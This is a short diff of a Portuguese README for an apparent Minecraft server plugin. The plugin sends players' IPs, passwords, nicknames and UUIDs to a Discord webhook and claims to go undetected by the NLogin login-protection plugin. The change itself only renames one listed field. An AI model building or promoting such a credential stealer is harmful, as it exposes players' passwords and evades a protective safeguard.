@@ -7,7 +7,7 @@ E todas as informações serão enviadas para um webhook que pode configurar na 
 - **Discord WebHook**
     - IP
     - SENHA
-    - USUARIO
+    - NICK
     - UUID
 - **Indetectável**
     - Indetectável do NLogin (Geralmente em servidores spigot, o nlogin não permite que outros plugins salvem os logins dos jogadores).
